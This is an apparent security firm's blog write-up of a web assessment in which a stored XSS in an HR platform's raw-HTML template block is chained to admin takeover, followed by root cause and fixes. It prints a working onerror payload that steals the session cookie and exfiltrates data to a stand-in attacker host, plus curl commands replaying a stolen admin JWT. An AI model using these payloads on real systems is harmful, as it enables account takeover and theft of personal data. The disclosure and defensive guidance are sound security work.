---
title: "A Raw-HTML Block in a Template Editor Gave Me Admin"
date: October 2026
source: https://blog.imperonlabs.com/blog/stored-xss-raw-html-template-to-admin-takeover.html
---

Web · XSS · Privilege Escalation

# A Raw-HTML Block in a Template Editor Gave Me Admin

By Yash Pandya · October 2026 · 15 min read

Every document builder with a drag-and-drop canvas eventually ships one block that is just a text area labeled, in effect, "paste code here." It is the most honest feature in the product and the most dangerous. On this engagement that block let a low-privileged HR user hand an Admin a payload, and two missing controls turned what should have been a contained, self-inflicted bug into full account takeover of the highest role in the tenant.

**Scope note.** This is a sanitized account of a real web assessment of a multi-tenant HR SaaS. The company, product, roles, domains, identifiers, and payloads below are invented stand-ins. Hosts use example.com and nothing here points at a live system. The technical mechanics, the HTTP flow, the CVSS, and the CWEs are exactly as found.

## At a glance

- **Severity:** Critical.
- **CVSS 3.1:** 9.0, vector `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H`.
- **Weaknesses:** CWE-79 (Stored XSS) chained to CWE-269 (Improper Privilege Management); contributing CWE-1004 (non-HttpOnly session cookie) and CWE-693 (missing Content-Security-Policy).
- **Boundary crossed:** HR (lower privilege, can manage templates) to Admin (full tenant control).
- **Proof:** same-origin execution confirmed, Admin session JWT read, fresh Admin token minted, Admin-only API action executed in the Admin's session.

## The target, and the two doors

The client, which I will call Meridian People, sells a multi-tenant HR and people-ops platform. Call the product Meridian Hub, served from `hr.example.com`. One backend, one origin, many tenants, and inside each tenant a tidy role model. The two roles that matter for this story are HR and Admin.

An HR user does HR things. They manage candidates and openings, and crucially they can create and edit the document templates the company uses: offer letters, policy acknowledgements, the boilerplate a people team sends all day. In the role matrix this maps to a single grant, something like `template.can_manage`. What an HR user cannot do is listed just as clearly. They cannot read the full document register across the tenant, they cannot manage other users, and they cannot touch the access-control settings. Those are Admin powers, and the server enforces that split correctly at the API. I checked, because an authorization story is only worth telling when the direct path is actually closed. It was. An HR token calling an Admin-only procedure gets a clean `403` with a "requires permission" message. No sloppy object-level bug here.

That matters, because it frames the whole finding. The interesting attacks on a well-built app are rarely "the server forgot to check." They are "the server checked, so I found a way to run as someone who passes the check." A low-privileged user who cannot read the register directly can still get it read, in full, if they can get code to run inside an Admin's browser. The template editor was the way to do exactly that.

## How the template editor works, and the block that should not exist

Meridian Hub's template editor is a drag-and-drop builder. You add blocks to a canvas: a heading block, a paragraph block, a variable block that interpolates things like the candidate's name at render time, a logo block, and so on. Pleasant, modern, the kind of thing a product demo loves. For the mechanics here the library behind it does not matter, and I am deliberately not naming it, because the sink is not the library's fault. It is how the application used one particular block.

Among the friendly blocks sits a raw-HTML block. The intent is reasonable on its face. Real offer letters want tables, inline styling, the occasional anchor, layout that the curated blocks cannot quite express, so the builder offers an escape hatch: a block whose contents are literally HTML that the author types. When you save the template, that block's contents are sent to the server in a field I will call `html`, through a procedure I will call `updateDocumentTemplate`. The server stores the string verbatim. No sanitization on write.

Then, when anyone in the tenant opens that template to view or edit it, the application takes the stored string and renders it into the page as live HTML. Think of the classic pattern: a string goes into an element's `innerHTML`, or into a framework's "render this HTML for me" prop, and the browser parses it into real DOM. No allowlist sanitizer sits in the middle. No sandbox. The template page lives at a normal top-level route, something like `GET /templates/{id}`, on the same origin as everything else the user is authenticated to.

So the data flow is: an author's typed HTML, stored raw, rendered raw, in the viewer's authenticated session, on the application's own origin. That is a stored cross-site scripting sink with a formal invitation. The only remaining questions are who can write to it, who renders it, and what the environment lets the resulting script do. Those three answers are the finding.

**A negative worth stating.** I tested the obvious siblings before I got excited. The variable-interpolation values that get substituted at render time were HTML-escaped on output, so no injection there, and template-expression probes like `{{7*7}}` and `${7*7}` came back as literal text, so no server-side template injection. The raw-HTML block was the one field that reached the DOM unescaped. A single sink, which is exactly how most real XSS lives: not everywhere, in one specific place someone decided to trust.

## Who can write it, who renders it

This is where the role model turns from a defense into the attack. The raw-HTML block is editable by the HR role, because managing templates is an HR job. Templates are shared across the tenant, which is the entire point of a template. And templates get reviewed and rendered by everyone who touches that workflow, including Admins, because an Admin opening a shared template to review it is not an exotic event. It is Tuesday.

So the writer is a lower-privileged role, and one of the renderers is the highest-privileged role, and the thing being passed between them is unsanitized HTML. The author and the victim are different people with different authority. That gap, between who controls a field and who executes it, is the entire mechanism by which a contained XSS becomes a privilege escalation. I keep a standing question for every writable field on every engagement: who else renders this, and at what privilege? Here the answer was "the Admin," and that answer is worth more than any clever payload.

## Planting the payload as a low-privileged user

I logged in as my HR test account, `[email protected]`, created a shared template, and dropped a raw-HTML block into it. The save goes through the normal editor save, which under the hood is the `updateDocumentTemplate` call carrying my `html` field. Here is a sanitized version of the write, done directly against the API to show there is nothing magic in the UI:

```
curl -sk 'https://hr.example.com/api/templates/updateDocumentTemplate' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=<HR_USER_JWT>' \
  --data '{"id":"tmpl-4f2a","html":"<h1>Offer Letter</h1><img src=x onerror=...>"}'
# HTTP 200, stored verbatim
```

The server answers `200` and, on a read-back, hands the string straight back out, byte for byte, including the `onerror` attribute. Nothing stripped, nothing encoded. At this point the bug is proven as stored XSS. What is not yet proven is that it is worth a Critical, and a responsible writeup does not stop at "the alert fired."

The payload I used in the real test was small and surgical. An image element that fails to load on purpose, so its `onerror` handler runs, and in that handler a short script that does three things in order: read the session cookie, call an Admin-only endpoint using the victim's own session, and ship both out to a collector I control. An illustrative version, using example.com everywhere, reads:

```
<img src=x onerror="
  var c = document.cookie;
  fetch('/api/documents/listDocuments', {method:'POST', credentials:'include'})
    .then(function(r){ return r.text(); })
    .then(function(body){
      new Image().src = 'https://collect.attacker.example/x'
        + '?cookie=' + encodeURIComponent(c)
        + '&data=' + encodeURIComponent(body.slice(0,1800));
    });
">
```

That is the whole weapon. No framework, no obfuscation, no second stage downloaded from anywhere. It reads a cookie the browser should never have let script see, it calls an API the account that planted it is explicitly forbidden from calling, and it exfiltrates the result, all from inside the DOM of a template an HR user was allowed to edit. The only thing it needs is for the right person to open the template. HR users do not get far opening their own payload. Admins are a different matter.

## Why it runs in the Admin's origin

When my Admin test account, `[email protected]`, opened the shared template at the top-level route `GET /templates/tmpl-4f2a`, the stored string was rendered into the page as live DOM and the `onerror` handler ran. There is nothing between the handler and the application. No iframe, let alone a sandboxed one. No separate render origin. The template body is injected into the same document the Admin is authenticated in, at the same origin, with the same cookies, the same local storage, and the same access to `fetch` and the application's own API client.

This is the part people under-weight. "It's just an XSS in a template preview" sounds like it should live in some quarantined widget. It did not. The render happened at a normal application route, in the first-party origin, in the Admin's logged-in tab. From the browser's point of view there is no difference between my injected script and the application's own code. They share a security context completely. Anything the application's own JavaScript can do to its API, my script can do, because to the browser they are the same principal.

So the question "what can this XSS do?" collapses into "what can the Admin do, and is the environment going to stop a script from doing it on their behalf?" The Admin can do everything. And the environment, it turned out, was going to stop nothing.

## Two missing seatbelts

A stored XSS in an Admin's origin is bad on any day. Whether it is a 6 or a 9 comes down to two controls that exist precisely to contain this situation. Meridian Hub shipped neither. Each one would have blunted the attack on its own. Together, their absence is what promotes a contained script to a full takeover.

### No Content-Security-Policy

I checked the response headers on every route that renders template content, because a Content-Security-Policy is the one control designed to make an injected inline script inert even after the injection succeeds. There was no `Content-Security-Policy` header at all. Not a weak one, not a permissive one with `'unsafe-inline'`, which is the usual disappointment. Simply absent.

With no CSP, the browser applies no restriction on what scripts may run or where the page may talk to. My inline `onerror` handler executes with no friction. My outbound request to `collect.attacker.example` is not blocked by any `connect-src`, because there is no `connect-src`. A policy as modest as `default-src 'self'` without `'unsafe-inline'` would have stopped the inline handler from running and stopped the exfiltration from leaving the origin. The absence of the header is not a cosmetic hardening gap here. It is the difference between a script that fails to execute and a script that executes and then phones home.

### The session cookie was not HttpOnly

The session cookie carried the user's session as a JWT, and it was not marked `HttpOnly`. That flag exists for one reason: to keep JavaScript from reading the cookie through `document.cookie`. Without it, reading the Admin's live session token is a single property access, which my payload performs on its first line.

It is worth being precise about what this flag does and does not buy, because it is routinely misjudged in both directions. Even with `HttpOnly` set, a same-origin XSS can still act through the session by firing authenticated `fetch` calls, since the browser attaches the cookie automatically. So `HttpOnly` never makes an XSS harmless. What it does change is portability. A non-HttpOnly session token can be read out of the browser, carried off, and replayed anywhere, from any client, long after the victim closed the tab. That turns a transient in-page foothold into a durable, exportable Admin credential. On this target the cookie was readable, so I did not have to settle for acting through the session while the tab stayed open. I could take the session with me.

## The chain: read the cookie, mint a token, act as Admin

With both seatbelts missing, the script ran the chain end to end in the Admin's session, and I confirmed each link rather than inferring it.

**Step one, read the cookie.** `document.cookie` returned the full cookie string in the Admin's context, including the session cookie holding the Admin's JWT. That alone defeats the non-HttpOnly cookie: the highest-privileged session token in the tenant, handed to script that a lower-privileged user authored.

**Step two, mint a fresh Admin token.** The platform uses a hosted identity service, reachable at an auth origin I will call `auth.example.com`, which exposes a client endpoint that returns a freshly minted session token when called with the session's credentials. Because my script runs same-origin and in the Admin's authenticated context, a credentialed call to that endpoint returns a brand-new, valid Admin session token on demand:

```
curl -sk 'https://auth.example.com/v1/client' \
  -H 'Cookie: session=<STOLEN_ADMIN_JWT>'
# HTTP 200 -> fresh admin session token, admin identity in the body
```

This is the step that upgrades the attack from "steal a cookie that might rotate or expire" to "manufacture Admin sessions at will." I am no longer dependent on a single captured token. I have a token factory.

**Step three, do something only an Admin can do.** The proof that matters to a client is not that script ran. It is that the script performed an action the attacker's own account is forbidden to perform. So the payload called the Admin-only document register, `POST /api/documents/listDocuments`, in the Admin's session. The contrast is the whole case, and I captured both sides directly.

My HR account, calling it in its own right:

```
curl -sk 'https://hr.example.com/api/documents/listDocuments' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=<HR_USER_JWT>' \
  --data '{}'
# HTTP 403  {"code":"FORBIDDEN","message":"requires documents.can_read"}
```

The same call riding the Admin session the XSS controlled:

```
curl -sk 'https://hr.example.com/api/documents/listDocuments' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=<STOLEN_ADMIN_JWT>' \
  --data '{}'
# HTTP 200  -> full tenant document register: candidate PII, offer records, everything
```

Same procedure, same tenant, two different answers, and the only variable is whose session is attached. `403` for the role that planted the payload, `200` and a body full of personal data for the role that rendered it. That is action-on-behalf-of-Admin, confirmed, not theorized. The exfiltration in step one carried the response out to my collector, so the data genuinely left the Admin's browser; I kept the outbound to a modest slice in the illustrative payload, but there is no size limit the application imposes on this, because it does not know the request is happening.

One field note on exfiltration, since clients ask. Because there is no CSP and therefore no `connect-src`, the outbound channel can be almost anything: an image request, a `fetch`, a beacon. On a hardened network you can even lean on name resolution rather than a plain HTTP egress, so the data survives egress filtering that would block a direct POST. The point for the report is not the specific channel. It is that once same-origin script holds the data and the policy imposes no destination control, getting it out is a formality.

One raw-HTML block, HR to Admin

1 HR saves template
raw HTML in the html field,
stored verbatim

2 Admin opens it
top-level route, same origin,
script runs as Admin

3 Reads the cookie
non-HttpOnly JWT,
no CSP to stop the script

4 Mints fresh Admin token
credentialed call to the
auth client endpoint

5 Admin-only action
listDocuments: 403 for HR,
200 + PII as Admin

The field is written by one role and executed by another. The missing CSP and the readable cookie remove the two controls that would otherwise keep the script boxed in.

## Impact

The result is full account takeover of the highest-privileged role in the tenant, achieved by a lower-privileged one, using nothing the lower role was not handed by design. From the Admin session the script reaches everything an Admin reaches: the full document register with candidate and employee personal data, compensation figures where offers carry them, tenant configuration, user management, and the access-control settings themselves. That last item is the ugly one, because an attacker who can edit access control can grant themselves durable standing privilege and stop depending on the XSS at all. The stored XSS is the way in; the Admin's authority is the blast radius; the token factory is what makes it persistent.

It is also quiet. The trigger is an Admin performing a completely ordinary action, opening a shared template, which produces no security signal anyone would notice. There is no phishing email to spot, no odd login, no second device. The malicious instruction was planted days earlier by an account that is supposed to edit templates, and it detonates during routine work. From the defender's chair it looks like the Admin simply used the product.

## Root cause

It is tempting to file this under "XSS" and move on, but the root cause is a layered trust mistake, and each layer is worth naming because fixing only one still leaves a bug.

The primary fault is treating author-controlled HTML as safe to render. A raw-HTML block is a loaded gun by definition, and the application rendered its contents into a first-party, authenticated, top-level document with no sanitization and no isolation. That is the sink, CWE-79.

The fault that makes it a privilege-escalation channel rather than a self-inflicted annoyance is that the field is written by a lower-privileged role and rendered by a higher-privileged one. The server's authorization was correct for direct API calls and completely bypassed by rendering, because rendering runs the attacker's code with the victim's authority. That is the CWE-269 chain, and no amount of endpoint permission checking closes it, because the escalation does not go through an endpoint the attacker calls as themselves.

The two faults that set the severity are the missing containment controls. No Content-Security-Policy, so an injected script runs and exfiltrates freely, CWE-693. A non-HttpOnly session cookie, so the session token is directly readable and portable, CWE-1004. Neither created the XSS. Both decided how far it would travel.

## How to fix it, in the order that pays off

Four fixes, and they stack. Doing any one of them downgrades the finding. Doing all four closes it.

1. **Sanitize or isolate the template HTML.** The clean answer is an allowlist sanitizer applied on both write and render, stripping event-handler attributes and script-bearing constructs so `onerror` and its relatives never survive. Better still for a document preview specifically, render the template body inside a sandboxed iframe without script permission, so even a surviving payload has no reach into the application origin. If the product can live without it, the strongest move is to drop the raw-HTML block entirely and express layout through curated, structured blocks that cannot carry executable content.
2. **Ship a strict Content-Security-Policy on every route, especially the ones that render user-authored content.** No `'unsafe-inline'`, a tight `script-src`, and a `connect-src` and `img-src` that name only the destinations the app legitimately talks to. That makes an injected inline script inert and cuts off the exfiltration path, so even a future sink that slips in cannot execute or phone home.
3. **Mark the session cookie `HttpOnly`, and set `Secure` and a sensible `SameSite`.** `HttpOnly` stops script from reading the token outright, which removes the portable-credential upgrade and the token-minting step that depended on holding the session value. It is not a substitute for the CSP, since a same-origin script can still act through the cookie, but it stops the attacker from walking out with a reusable Admin credential.
4. **Never hand user-authored content to `innerHTML` or an equivalent "render this HTML" path.** Default to text rendering and structured DOM construction, and add a regression test that stores an event-handler breakout payload in a template and asserts that no script executes on render, so this exact bug cannot return quietly after a refactor.

## Why stored XSS is still a 9.0 in 2026

There is a persistent belief that XSS is a solved, low-tier finding, the sort of thing that earns a shrug and a "add a sanitizer." Frameworks escape by default now, the thinking goes, so surely this is a relic. The frameworks did help, which is precisely why the XSS that remains is concentrated in the handful of places where a developer opted out of the default: a raw-HTML block, a "render trusted HTML" prop, a widget that wants a string. Those opt-outs are where the bugs live now, and they tend to sit in exactly the content-authoring features that cross privilege boundaries.

The severity was never really about the alert box. It is about whose origin the code runs in and what that origin can do. Put a stored payload in a first-party, authenticated, same-origin context, let it be authored by one role and rendered by a more powerful one, and remove the two controls that would contain it, and you do not have a cross-site scripting nuisance. You have remote code execution inside the victim's trust boundary, a readable credential, and a token factory. That is a 9.0 in any year, and the fact that the pieces are individually old does not make the chain any less complete.

The one line to remember
Correct access control at the API does nothing about a field one role writes and a more privileged role renders. Encode or isolate the output, add a CSP, and make the session cookie HttpOnly, because that is what decides whether an XSS stays in its box.

### Which of your features let one role author what another role executes?

Imperonlabs reads your bundles, your response headers, and your role model together, then chains the gaps the way a real attacker would, from the stored field to the exfiltrated record with the response in hand. Book a scoping call and we will find where your controls only look like controls.

[Request an assessment](https://imperonlabs.com/#contact)
